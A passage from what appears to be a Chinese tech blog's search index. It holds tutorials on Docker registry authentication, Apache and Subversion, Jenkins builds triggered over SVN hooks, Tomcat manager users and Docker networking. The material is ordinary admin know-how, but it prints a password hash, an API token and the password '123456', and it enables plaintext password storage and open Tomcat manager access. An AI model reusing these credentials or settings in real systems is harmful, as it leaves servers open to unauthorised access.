/etc/docker/registry-auth/htpasswdclay:$2y$05$nkzz4O9BARoZb8O61WHmLelm29GI/qOv3gUKimy5aTtDvm1tmg30e# 创建并启动带身份验证的registry容器，添加5000端口映射和数据卷，其中/var/lib/registry目录是registry容器存放Docker镜像的位置# 这里必须通过数据卷将宿主机保存私有仓库帐号信息的目录/etc/docker/registry-auth挂载到registry容器内的目录/auth，然后Docker验证用户身份时会在容器内找"REGISTRY_AUTH_HTPASSWD_PATH"指向的文件# docker run -p 5000:5000 --restart always --name docker-registry \\ -v /container/registry:/var/lib/registry \\ -v /etc/docker/registry-auth:/auth \\ -e "REGISTRY_AUTH=htpasswd" \\ -e "REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm" \\ -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \\ -d registry# 登录私有仓库，成功后帐号信息默认存放在~/.docker/config.json# docker login --username=clay 127.0.0.1:5000# 查看私有仓库列表，此时通过cul命令访问带身份验证的私有仓库，必须指定用户名/密码# curl -X GET -u clay:123456 http://127.0.0.1:5000/v2/_catalog# 执行"docker login"操作之后，就可以往私有仓库Push或者Pull镜像了# docker pull 127.0.0.1:5000/clay-tomcat:1.0 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Debian 安装 Apache 与 Subversion",url:"/posts/1b3fbf25.html",text:'前言 通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP、SVN 协议访问 SVN 仓库，并进行细粒度的权限控制，本教程适用于 Debian/Ubuntu 系统。 系统环境 12345678# uname -a# Linux debian 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 GNU/Linux# cat /etc/os-releasePRETTY_NAME="Debian GNU/Linux 9 (stretch)"NAME="Debian GNU/Linux"VERSION_ID="9"VERSION="9 (stretch)" 安装软件 1234567891011# 更新软件索引# apt-get update# 安装apache# apt-get install -y apache2 apache2-utils# 安装subversion，适用于debian# apt-get install -y subversion subversion-tools libapache2-mod-svn# 安装subversion，适用于ubuntu# apt-get install -y subversion subversion-tools libapache2-mod-svn libapache2-svn 验证 Apache 是否安装成功 123456789101112131415161718192021222324252627282930313233343536# 启动apache服务# service apache2 start# 或者执行# /etc/init.d/apache2 start# 查看apache是否占用80端口# netstat -anp|grep 80# 查看防火墙状态# ufw status# 如果开启了防火墙，则开放80端口# ufw allow 80/tcp# 保存防火墙配置# ufw reload# 浏览器输入以下地址访问apache服务，如果访问正常则说明apache安装并启动成功http://127.0.0.1# 服务管理命令# 关闭：service apache2 stop# 启动：service apache2 start# 重启：service apache2 restart# 查看状态：service apache2 status# 前台方式启动：apachectl -D FOREGROUND# 取消自启动：update-rc.d apache2 remove# 开机自启动：update-rc.d apache2 defaults# 相关目录文件说明：# 安装目录：/usr/lib/apache2# 启动脚本路径：/etc/init.d/apache2# 配置文件目录：/etc/apache2# 主配置文件：/etc/apache2/apache2.conf# 端口配置文件：/etc/apache2/ports.conf 创建 SVN 仓库，并配置 Apache 的访问权限 12345678910111213141516171819202122232425262728293031# 创建存放所有SVN仓库的目录# mkdir /var/lib/svn# 创建SVN仓库jenkins-repo# svnadmin create /var/lib/svn/jenkins-repo# 将SVN仓库的读写权限授给apache用户# chown -R www-data:www-data /var/lib/svn/jenkins-repo# 配置apache的svn模块，在对应配置文件的末尾追加以下内容# 这里相当于配置与Apache登录相关的内容（例如登录密码验证），只有dav_svn.passwd指定的用户才有权限访问所有仓库，下面会详细介绍相关配置# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# 创建Apache用户的密码文件，将jenkins替换为你自己指定的用户名，回车执行之后输入密码即可# 注意这里的用户密码和Subversion仓库本身的身份校验机制（authz）没有任何关系，只用于Apache登录校验# htpasswd -cm /etc/apache2/dav_svn.passwd jenkins# 修改用户密码文件的权限# chgrp www-data /etc/apache2/dav_svn.passwd# chmod 660 /etc/apache2/dav_svn.passwd# 重启apache服务# service apache2 restart mod_dav_svn 模块的其他配置介绍（如果嫌麻烦可忽略） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 配置文件路径：/etc/apache2/mods-enabled/dav_svn.conf# 下面配置中的"SVNParentPath /var/lib/svn"表示/var/lib/svn目录下的每个子目录都是一个仓库（即所有仓库的根目录），同时表示&lt;Location&gt;标签内的任何权限配置都被所有仓库共用；&lt;Location&gt;标签内的/svn，指通过HTTP协议访问时的URL路由&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require valid-user&lt;/Location&gt;# 如果想要指定多个仓库，让每个仓库都拥有不同的访问权限配置，那么可以使用多个Location标签，同时需要将标签内的“SVNParentPath”替换为“SVNPath”，并指向具体仓库的目录&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd Require valid-user&lt;/Location&gt;&lt;Location /svn/python-repo&gt; DAV svn SVNPath /var/lib/svn/python-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/python-repo.passwd Require valid-user&lt;/Location&gt;# 如果替换上述"Require valid-user"为"Require user tony robert"，那么只有tony和robert用户可以访问所有仓库&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd Require user tony robert&lt;/Location&gt;# 通过使用&lt;LimitExcept&gt;标签，允许匿名读取所有仓库，而只有认证用户才能对所有仓库进行写操作&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd &lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt; Require valid-user &lt;/LimitExcept&gt;&lt;/Location&gt; 验证 HTTP SVN 是否可用 12345678910111213141516171819202122232425262728293031# 浏览器输入以下地址来访问SVN仓库，其中/svn是&lt;Location&gt;标签内的值，而jenkins-repo是上面创建的SVN仓库，访问之后页面会提示你输入用户名和密码http://127.0.0.1/svn/jenkins-repo/# 配置SVN客户端允许以明文方式保存密码到本地磁盘，首次使用svn客户端的情况下可能不存在servers配置文件，此时可忽略配置$ vim ~/.subversion/servers[global]store-plaintext-passwords = yes# 检出SVN仓库jenkins-repo，指定使用jenkins用户进行登录，其中/svn是&lt;Location&gt;标签内的值，而jenkins-repo是上面创建的SVN仓库，回车之后会提示你输入密码$ svn checkout --username jenkins http://127.0.0.1/svn/jenkins-repo/# 进入刚检出的仓库目录$ cd jenkins-repo# 创建文件$ touch api.version# 将指定文件纳入SVN版本控制$ svn add api.version# 将指定文件提交到SVN仓库$ svn commit -m "add file" api.version# 显示工作区中目录与文件的状态，如果上述步骤都成功执行，执行该命令后则不会有任何日志信息输出$ svn status# 可以使用以下命令查询svn命令具体的使用方法$ svn --help$ svn commit --help# 至此，通过Apache、Subversion搭建SVN服务器（HTTP）的步骤算是基本完成了，下面将介绍使用Apache的mod_authz_svn模块对仓库目录进行更细粒度的权限控制，如果不需要细粒度的权限控制，则不用继续往下阅读了。 通过 mod_authz_svn 模块对仓库目录的访问进行细粒度权限控制 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 进入对应SVN仓库的目录# cd /var/lib/svn/jenkins-repo# 每个SVN仓库目录下都有对应的身份校验文件（authz、passwd），由SVN自动创建# tree confconf|-- authz|-- hooks-env.tmpl|-- passwd`-- svnserve.conf# 添加SVN仓库的用户帐号，注意这里的用户名/密码，需要和访问Apache的用户名/密码一致# 即用户名/密码需要和"AuthUserFile /etc/apache2/dav_svn.passwd"指定的帐号信息一致# vim conf/passwd[users]jenkins = 123456# 配置SVN仓库的用户组、读写权限# vim conf/authz[groups]team = jenkins[/]@team = rw# 编辑SVN仓库的配置文件，对应内容修改如下，其中“anon-access”项的值必须为none# vim conf/svnserve.conf[general]anon-access = noneauth-access = writepassword-db = passwdauthz-db = authz# 配置authz功能，其中AuthzSVNAccessFile指向的是SVN仓库的authz策略文件，多个SVN仓库可以使用多个&lt;Location&gt;标签进行配置，注意这里使用的是“SVNPath”，而不是"SVNParentPath"# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd AuthzSVNAccessFile /var/lib/svn/jenkins-repo/conf/authz Require valid-user&lt;/Location&gt;# 如果使用”SVNParentPath“代替”SVNPath“来指定多个仓库的父目录时，那么所有仓库都将按照指定的策略文件来管理读写权限；此时如果要对具体每个仓库分别配置不同读写权限，authz文件内需要使用如下的语法进行配置：&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd AuthzSVNAccessFile /etc/svn/svn_authz Require valid-user&lt;/Location&gt;# vim /etc/svn/svn_authz[groups]project1_committers = paulex richardproject2_committers = jimmy michel[repos1:/]@ project1_committer = rw[repos2:/]@ project2_committer = rw# 重启apache服务# service apache2 restart 启动 Subversion 服务 1234567891011121314151617181920# 默认情况下，通过Apache、Subversion搭建SVN服务器，如果只需要通过HTTP协议访问SVN仓库，则无需启动Subversion服务，相反如果想通过SVN协议直接访问SVN仓库则需要启动# 其中/var/lib/svn是所有SVN仓库的父目录，如果直接使用SVN协议，那么SVN仓库的用户登录与读写权限控制默认是通过每个仓库下的passwd、authz、svnserve.conf配置文件分别进行控制，此时与Apache没有任何关系# 参数 -d 表示后台运行，否则默认前台运行# svnserve -d -r /var/lib/svn# 测试SVN客户端使用SVN协议检出仓库jenkins-repo，指定使用jenkins用户进行登录，其中3690是Subversion服务的默认端口# svn checkout --username jenkins svn://127.0.0.1:3690/jenkins-repo# 查看防火墙状态# ufw status# 如果开启了防火墙，则开放3690端口# ufw allow 3690/tcp# 保存防火墙配置# ufw reload# 关于Subversion服务开机自启动的两种方式：# 方式一：使用第三方工具Supervistor实现Subversion开机自启动# 方式二：将配置Subversion配置成系统服务，由systemctl管理开机自启动 Dockerfile 里配置容器启动时默认启动 Apache 与 Subversion 1234567RUN echo "svnserve -d -r /var/lib/svn" &gt; /usr/local/start-servers.shRUN echo "apachectl -D FOREGROUND" &gt;&gt; /usr/local/start-servers.shRUN chmod +x /usr/local/start-servers.shCMD /bin/bash /usr/local/start-servers.sh# 以后创建并以后台方式启动容器时，Apache与Subversion服务会默认自启动# docker run -d -p 9126:80 -p 4690:3690 ... Centos7 安装 Apache&amp;Subversion How to Setup an Apache Subversion (SVN) Server on CentOS 7 The Ultimate Guide to Setting Up Apache Subversion SVN and TortoiseSVN For Version Control 本文引用 Install Apache SVN (Subversion) on Debian 9 / Ubuntu 16.04 使用 Apache 和 Subversion 搭建安全的版本控制环境（Http、Https、MySQL 存储 Apache 用户信息） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战",url:"/posts/bd0f3a17.html",text:'上篇：Jenkins 入门教程之二 Jenkins 与 SVN 搭建 CI-CD 环境 下面的实战内容是在上篇内容的基础上进行操作的，为了保证连贯性，建议先将上篇的操作步骤执行完再阅读本篇内容。 通过 Eclipse 创建基于 Maven 的 SpringBoot Web 项目，用于测试 Maven 构建项目 创建 Maven 项目的时候，Archetype 选择”maven-archetype-quickstart”，此 SpringBoot Web 项目不需要 web.xml，只需在 pom.xml 配置文件里指定 packaging 为 war 类型即可。项目内容很简单，访问 JSP 页面直接输出字符串 “hello Jim”。项目源码下载链接已经给出，下载解压后直接导入项目到 Eclipse，执行”spring-boot:run” 命令即可运行项目，浏览器输入以下地址验证是否运行正常：http://127.0.0.1:8080/demo/hello，点击下载完整的代码 、点击下载 SHA256 校验文件。 在 Eclipse 里创建 SVN 资源库，并将 SpringBoot Web 项目的源码提交 SVN 资源库 这里的 SVN 资源库是上一篇教程里创建的 Subversion 仓库 jenkins-repo，访问的用户名是 jenkins，密码是 123456；因为宿主机与 Docker 容器（SVN）配置了端口映射，因此 Eclipse 里可以直接使用以下 URL 访问对应的 SVN 仓库： http://127.0.0.1:9126/svn/jenkins-repo 将 jenkins-study 项目的源码提交到 SVN 资源库后的目录结构 Jenkins 创建任务 选择 “构建自有风格的软件项目” 找到 “Source Code Management”，选择 “Subversion”，点击”Add” 按钮，添加访问 SVN 仓库 jenkins-repo 的用户名和密码 在 “Source Code Management” 中继续填写 jenkins-study 项目所在 SVN 仓库 jenkins-repo 完整的 URL 地址，选择上面添加的 SVN 仓库用户名和密码；构建类型选择 “Invoke top-level Maven targets”，而 Maven 版本则选择之前在 “全局工具配置” 中指定的 Maven 版本，构建命令填 “clean install”，最后保存设置内容。特别注意，如果这里的 URL 地址使用 SVN 协议，那 Jenkins 将会提示无效 URL 的错误信息，因此需要使用 HTTP 协议来访问 SVN 仓库，同时完整的 URL 地址必须包含 Maven 项目的名称，因为 Jenkins 默认会去找 URL 地址下的 pom.xml 文件。使用 HTTP 协议访问的前提是 Subversion 集成了 Web 服务，具体教程在这里，通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP/SVN 协议访问 SVN 仓库 12345678# 因为SVN服务安装在Docker容器内（基于Debian镜像），Jenkins同样也安装在Docker容器内（基于Tomcat镜像），因此下图URL中的IP是SVN服务所在Docker容器的IP。因为之前在Docker容器内安装Subversion并集成了Apache，而Apache默认端口是80，所以下图的URL地址可以不指定具体的端口。# 获取SVN服务所在Docker容器的IP地址# docker exec -it svn-httpd ip addr111: eth0@if112: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever 手动对之前的 jenkins-study 项目执行构建操作 构建过程中，Jenkins 默认会从 SVN 仓库检出对应的项目源码到 ～/.jenkins/workspace 目录（Jenkins 所在服务器的文件目录），同时在 Jenkins 构建任务页面左边的小窗口内可以看到相关构建信息（构建进度、日志等）。第一次构建过程耗时会比较长，因为 Maven 需要从中央仓库下载很多依赖包；如果想加快构建速度，局域网内可以通过 Nexus 搭建 Maven 本地仓库，然后在 Maven 的配置文件 settings.xml 中添加本地仓库的地址。 配置构建完成后将 War 包部署到 Tomcat 应用服务器 这里的 Tomcat 应用服务器，一般指测试服务器或者生产服务器。由于 Jenkins 需要将 War 部署到 Tomcat 服务器上，因此这里的 Tomcat 服务器需要预先需要配置管理员用户。先找到”Post-build Actions” 配置项，选择”Add post-build action” –&gt; “Deploy war/ear to a container（依赖 deploy to container 插件）”，然后填写 War 包文件的相对路径、访问 Tomcat 项目时使用的项目名称。接着选择”Add Container” –&gt; “Tomcat 8.x”，点击 “Add” 按钮，填写 Tomcat 服务器管理员用户的用户名和密码、访问 Tomcat 服务器的 URL 地址，然后点击 “Save” 按钮保存设置。最后再次执行构建操作，构建完成后可以查看构建日志或者在浏览器输入以下地址，验证构建生成的 War 包文件是否成功部署到指定的 Tomcat 服务器上，浏览器可以访问 URL：http://127.0.0.1:8082/jenkins-study/demo/hello (adsbygoogle = window.adsbygoogle || []).push({}); 配置远程触发构建 找到”Build Triggers” 配置项，勾选”Trigger builds remotely”，填写 Token 的值（任意字符串），最后点击”Save” 按钮保存设置。通过浏览器或者 CURL 工具访问链接 http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt ，测试远程触发构建是否配置成功；其中 http://127.0.0.1:8888/jenkines 是访问 Jenkins 服务器的 URL 地址。构建成功后，在 Jenkins 构建任务页面左边的小窗口（构建历史）内可以看到新创建的构建历史。 获取用户的 crumb 值，使用 CURL 命令触发远程构建时需要用到 一般来说，当在 Jenkins 内启用了” 防止跨站点请求伪造”，且通过 CURL 命令触发远程构建时才需要带上 crumb 值。下面先介绍如何获取某用户的 API Token，因为后续将用到 API Token 的值。 1234567891011# 浏览器输入以下地址获取某用户的crumb值，其中clay是用户名，115613e7bde4a846d49800f9e004cda2e4是上面获取得到的API Tokenhttp://clay:115613e7bde4a846d49800f9e004cda2e4@127.0.0.1:8888/jenkins/crumbIssuer/api/xml# 返回结果为某用户的crumb值&lt;defaultCrumbIssuer _class="hudson.security.csrf.DefaultCrumbIssuer"&gt; &lt;crumb&gt;a2088f0de8aca0d5a05079eed6ea972a&lt;/crumb&gt; &lt;crumbRequestField&gt;Jenkins-Crumb&lt;/crumbRequestField&gt;&lt;/defaultCrumbIssuer&gt;# 以后触发Jenkin远程构建时需要携带的请求消息头为以下值Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a 通过 CURL 命令触发远程构建 1234567# 首先按照上面的操作，配置远程触发构建，并获取某用户的crumb值# 命令的格式# curl -X post -v -u [Jenkins 用户名]:[Jenkins 密码] -H "请求消息头信息" http://[Jenkins 服务器IP地址]:[Jenkins 服务器端口号]/jenkins/job/[Jenkins 项目名称]/build?token=[API Token]# 完整的CURL命令，构建成功后在Jenkins构建任务左边的小窗口（构建历史）内可以看到新创建的构建历史# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 配置 SVN 钩子程序 12345678910111213# 连接Docker容器（SVN）# docker exec -it jenkins-svn-httpd /bin/bash# 进入SVN仓库jenkins-repo的hooks目录，并创建钩子程序（不带.tmpl后缀）,然后赋予可执行的权限# cd /var/lib/svn/jenkins-repo/hooks# cp post-commit.tmpl post-commit# chmod 755 post-commit# 编辑post-commit文件，将文件原有的内容都注释掉，然后在文件末尾追加CURL命令# 注意，由于SVN与Jenkins服务都部署在Docker容器内，因此这里CURL命令中的服务器IP不能是127.0.0.1，必须是Jenkins服务所在Docker容器的IP# vim post-commit# "$REPOS"/hooks/mailer.py commit "$REPOS" $REV "$REPOS"/mailer.conf# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 验证 SVN 钩子程序是否生效 Eclipse 内修改 Maven 项目 jenkins-study 的代码，然后将代码提交到 SVN 仓库，观察 Jenkins 构建任务页面左边的小窗口（构建历史）内是否有新构建历史出现，如果有则说明 SVN 钩子程序生效了。 Jenkins 常规构建流程总结 下篇：Jenkins 入门教程之四 Jenkins 与 Git 持续集成实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ci/cd"},{title:"Centos7 安装图片处理软件 GIMP",url:"/posts/3cf5ae19.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux GIMP 安装 GIMP 算得上是 Linux 系统下的 Photoshop，基于 GTK 编写的图像编辑处理软件，功能非常强大。 1234567891011121314# 安装EPEL源# yum install epel-release# 查看源# ls /etc/yum.repos.d/# 更新源# yum clean all &amp;&amp; yum makecache# 安装基础依赖包# yum install aalib aalib-devel libexif-devel libjpeg-devel libpng-devel# 安装GIMP# yum install gimp mtPaint 安装 mtPaint 是 Linux 下的一款优秀的画图软件，推荐安装使用。 1# yum install mtpaint Shutter 安装 Shutter 是一款 Linux 截图工具，支持截图后自动保存、自动复制到剪切板、并且可以编辑，可以说是 Linux 下最强大的截图工具，推荐安装使用。安装后可以添加系统快捷键，名称：shotcut，命令：shutter -s，快捷键：Ctrl+Alt+A。 12345# 安装源# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# 安装# yum install -y shutter var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Tomcat 常用配置详解",url:"/posts/f77da043.html",text:'Tomcat8 配置管理用户 12345678910111213141516171819202122232425262728293031323334# 编辑Tomcat8对应的配置文件，在&lt;tomcat-users&gt;标签内添加以下内容，配置Tomcat的管理用户# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# 编辑manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 编辑host-manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 重启Tomcat服务器使配置生效# 注意：# 关于如何Tomcat配置管理用户，不同版本的Tomcat配置方法有差异，上面仅演示Tomcat8版本的配置方法。# 由于Tomcat8默认启用了网段限制，默认只有127网段局域网的机器才拥有有访问权限，如果是其他网段登陆，如172，10网段会报403错误，因此需要按照上面的方法修改对应的context.xml配置文件。# 出于安全考虑，在生产环境中建议启用默认的网段限制，即只允许在本地访问Tomcat服务器的管理页面。# Tomcat8共有6种权限（包括文档中说明了4种以及host-manager页面出错提示的2种），具体如下：# admin-gui&nbsp;— 可访问 "host管理" 页面，但"APP管理" 和 "服务器状态" 页面无查看权限# manager-gui&nbsp;— 无 "host管理" 页面访问权限，有"APP管理" 和 "服务器状态" 页面查看权限# manager-status&nbsp;— 只有"服务器状态" 页面查看权限# manager-script&nbsp;— 有脚本方式管理接口访问权限和"服务器状态" 页面查看权限# manager-jmx&nbsp;— JMX 代理接口访问权限和"服务器状态" 页面查看权限# admin-script&nbsp;— 只有host-manager脚本方式管理接口访问权限 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"web服务器"},{title:"OpenStack 之一 OpenStack 介绍",url:"/posts/fcb4fc9d.html",text:'IaaS，PaaS，SaaS 的区别 主流的云计算平台 OpenStack、CloudStack、Eucalyptus、vCloud Director var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Docker 之十四 Docker 四大网络模式",url:"/posts/e6921476.html",text:'Docker 四大网络模式 桥接模式、主机模式、容器模式、无网络模式 Docker 四大网络模式之一（bridge） 该模式是 Docker 的默认设置，Docker 守护进程创建了一个虚拟以太网桥 docker0，附加在其上的任何网卡之间都能自动转发数据包。默认情况下，守护进程会创建一对对等接口，将其中一个接口设置为容器的 eth0 接口，另一个接口放置在宿主机的命名空间中，从而将宿主机上的所有容器都连接到这个内部网络上。守护进程还会从网桥的私有地址空间中分配一个 IP 地址和子网给该容器。注意启动容器的时候需要指定 - p（固定端口分配） 或者 -P（动态端口分配）参数来暴露端口，否则 IP 数据包就不能从宿主机之外路由到容器中。 1234567891011# docker run -d -p 8888:8080 --net=bridge --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES223e6aee4801 tomcat:8 "catalina.sh run" 23 seconds ago Up 21 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat8# 查看宿主机的虚拟网桥列表# brctl showbridge name bridge id STP enabled interfacesdocker0 8000.0242e6d2901f no veth3074090 Docker 四大网络模式之二（host） 该模式将禁用 Docker 容器的网络隔离，因为容器共享了宿主机的 Network Namespace，直接暴露在公共网络中。容器将不会虚拟出自己的网卡和配置自己的 IP 等，即容器直接使用宿主机的 IP 和端口。该模式比 bridge 模式更快（因为没有路由开销），但是它将容器直接暴露在公共网络中，存在安全隐患。 1234567891011121314151617# docker run -d --net=host --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES363792e07323 tomcat:8 "catalina.sh run" 6 minutes ago Up 6 minutes tomcat8# 查看宿主机的IP信息# ip addr | grep -A 2 eth0:2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0# 查看容器的IP信息，可以发现容器和宿主机具有相同的IP地址192.168.1.130# docker exec -it tomcat8 ip addr2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0 Docker 四大网络模式之三（container） 该模式会重用另一个容器的网络命名空间。通常来说，当你想要自定义网络栈时，该模式是很有用的。实际上，该模式也是 Kubernetes 使用的网络模式。 12345678910111213141516171819# 以桥接模式启动第一个容器# docker run -d -p 8888:8080 --net=bridge --name="tomcat8-1" tomcat:8# 查看第一个容器的IP信息# docker exec -it tomcat8-1 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever# 以container模式启动第二个容器，同时指定重用第一个容器的网络命名空间；注意此时两个容器内的Tomcat服务器不能使用相同的监听端口，否则会造成端口冲突导致Tomcat容器启动失败# docker run -d --net="container:tomcat8-1" --name="tomcat8-2" tomcat:8# 查看第二个容器的IP信息，可以发现与第一个容器的IP地址一样都是172.17.0.2# docker exec -it tomcat8-2 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever Docker 四大网络模式之四（none） 